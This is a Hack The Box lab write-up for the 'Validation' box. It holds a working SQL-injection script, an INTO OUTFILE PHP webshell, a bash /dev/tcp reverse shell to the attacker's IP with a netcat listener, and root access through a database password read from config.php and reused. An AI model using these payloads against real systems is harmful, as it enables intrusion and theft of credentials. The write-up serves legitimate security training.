---
layout: single
title: Validation - Hack The Box
excerpt: "Validation is another box HTB made for the UHC competition. It is a qualifier box, meant to be easy and help select the top ten to compete later this month. Once it was done on UHC, HTB makes it available. In this box, I’ll exploit a second-order SQL injection, write a script to automate the enumeration, and identify the SQL user has FILE permissions. I’ll use that to write a webshell, and get execution. For root, it’s simple password reuse from the database. In Beyond Root, I’ll look at how this box started and ended in a container."
date: 2025-07-20
classes: wide
header:
  teaser: /img2/validation.png
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Linux
  - Easy
tags:
  - SQL (Error Based)
  - SQL > RCE (INTO OUTFILE)
  - Information Leakage
---


## Reconnaissance

- Nmap

```bash
❯ nmap -sS --open -p- --min-rate 5000 -n -Pn 10.10.11.116
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-20 15:09 CEST
Nmap scan report for 10.10.11.116
Host is up (0.030s latency).
Not shown: 65189 closed tcp ports (reset), 342 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
4566/tcp open  kwtc
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 11.33 seconds
```

## Exploitation

- SQL Injection (Error Based)

![](/img2/Pasted%20image%2020250720151310.png)

![](/img2/Pasted%20image%2020250720151356.png)

> Vemos que al registrarnos podemos elegir el país del usuario, es probable que en la selección de países haya una query por detrás, por eso podemos probar a corromper la query.

![](/img2/Pasted%20image%2020250720154709.png)

![](/img2/Pasted%20image%2020250720154746.png)

- SQL Injection -> RCE (INTO OUTFILE)

```python
import requests
import signal
import sys
from bs4 import BeautifulSoup

## Control + C


def def_handler(sig,frame):
	print("\n\n[!] Exiting...\n")
	sys.exit(1)


signal.signal(signal.SIGINT,def_handler)



def SQLI():

	while True:
		query=input("\n >> ")
		data={'username':'test','country':f"Brazil'union {query}-- -"}
		headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://10.10.11.116", "Connection": "keep-alive", "Referer": "http://10.10.11.116/", "Upgrade-Insecure-Requests": "1", "Priority": "u=0, i"}
		r1=requests.post(url="http://10.10.11.116/",data=data,headers=headers,allow_redirects=False)
		cookie={r1.headers['Set-Cookie'].split('=')[0]:r1.headers['Set-Cookie'].split('=')[-1]}


		r2=requests.get(url="http://10.10.11.116/account.php",cookies=cookie)
		soup=BeautifulSoup(r2.text,"html.parser")

		try:
			li_tags=soup.find("li")

			for i in li_tags:
				print(i)
		except:
			pass


if __name__=='__main__':
	SQLI()
```

```bash
❯ rlwrap python3 sqli.py
```

```ruby

 >> select version()
10.5.11-MariaDB-1

 >> select '<?php system($_GET["cmd"]); ?>' into outfile '/var/www/html/cmd.php'
```

![](/img2/Pasted%20image%2020250720211512.png)

- Reverse Shell

```bash
❯ echo -n "/bin/bash -i >& /dev/tcp/10.10.14.6/9000 0>&1" | base64
```

```ruby
L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjYvOTAwMCAwPiYx
```

![](/img2/Pasted%20image%2020250720211905.png)

```bash
❯ nc -nlvp 9000
```

```ruby
listening on [any] 9000 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.11.116] 57264
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@validation:/var/www/html$  
```

## Post-exploitation

- Information Leakage

```bash
www-data@validation:/var/www/html$ cat config.php 
```

```ruby
<?php
  $servername = "127.0.0.1";
  $username = "uhc";
  $password = "uhc-9qual-global-pw";
  $dbname = "registration";

  $conn = new mysqli($servername, $username, $password, $dbname);
?>
```

```bash
www-data@validation:/var/www/html$ su root
```

```ruby
Password: 
root@validation:/var/www/html#
```


![](/img2/Pasted%20image%2020250720212305.png)